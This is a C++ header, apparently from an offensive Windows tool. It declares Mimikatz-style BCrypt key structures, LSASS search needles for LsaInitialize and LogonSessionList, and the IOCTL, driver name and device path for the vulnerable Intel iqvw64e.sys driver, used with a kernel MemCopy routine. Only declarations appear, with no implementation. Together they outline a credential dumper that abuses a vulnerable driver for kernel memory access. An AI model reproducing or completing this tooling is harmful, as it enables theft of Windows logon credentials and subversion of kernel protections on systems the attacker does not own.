#pragma once
#include <Windows.h>
#include <iostream>
#include <atlstr.h>

#define SystemModuleInformation ((SYSTEM_INFORMATION_CLASS)11)
typedef struct _RTL_PROCESS_MODULE_INFORMATION {
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, * PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
	ULONG NumberOfModules;
	RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, * PRTL_PROCESS_MODULES;

typedef enum _SHUTDOWN_ACTION {
	ShutdownNoReboot,
	ShutdownReboot,
	ShutdownPowerOff
} SHUTDOWN_ACTION, * PSHUTDOWN_ACTION;

//NTSYSAPI NTSTATUS NTAPI NtShutdownSystem(IN SHUTDOWN_ACTION);
typedef NTSTATUS(*NTSHUTDOWNSYSTEM)(IN SHUTDOWN_ACTION);


typedef struct _KIWI_HARD_KEY {
	ULONG cbSecret;
	BYTE data[60]; // etc...
} KIWI_HARD_KEY, * PKIWI_HARD_KEY;

typedef struct _KIWI_BCRYPT_KEY81 {
	ULONG size;
	ULONG tag;	// 'MSSK'
	ULONG type;
	ULONG unk0;
	ULONG unk1;
	ULONG unk2;
	ULONG unk3;
	ULONG unk4;
	PVOID unk5;	// before, align in x64
	ULONG unk6;
	ULONG unk7;
	ULONG unk8;
	ULONG unk9;
	KIWI_HARD_KEY hardkey;
} KIWI_BCRYPT_KEY81, * PKIWI_BCRYPT_KEY81;

typedef struct _KIWI_BCRYPT_HANDLE_KEY {
	ULONG size;
	ULONG tag;	// 'UUUR'
	PVOID hAlgorithm;
	PKIWI_BCRYPT_KEY81 key;
	PVOID unk0;
} KIWI_BCRYPT_HANDLE_KEY, * PKIWI_BCRYPT_HANDLE_KEY;

typedef struct {
	ULONGLONG id;
	ULONGLONG vaddress;
	ULONGLONG start;
	ULONGLONG end;
	ULONGLONG size;
	char image[MAX_PATH];
} VAD;

typedef struct {
	CHAR LsaInitialize[16];
} LSAINITIALIZE_NEEDLE;

typedef struct {
	CHAR LogonSessionList[12];
} LOGONSESSIONLIST_NEEDLE;

namespace intel
{

	const uint32_t ioctl = 0x80862007;
	const char* driver_name = "iqvw64e.sys";
	const char szDevice[] = "\\\\.\\Nal";

	
	typedef struct _MEMCPY_BUFFER_INFO
	{
		uint64_t switch_num;
		uint64_t reserved;
		uint64_t source;
		uint64_t dest;
		uint64_t count;
	}MEMCPY_BUFFER, * PMEMCPY_BUFFER;

	bool MemCopy(HANDLE device_handle, uint64_t destination, uint64_t source, uint64_t size);
}
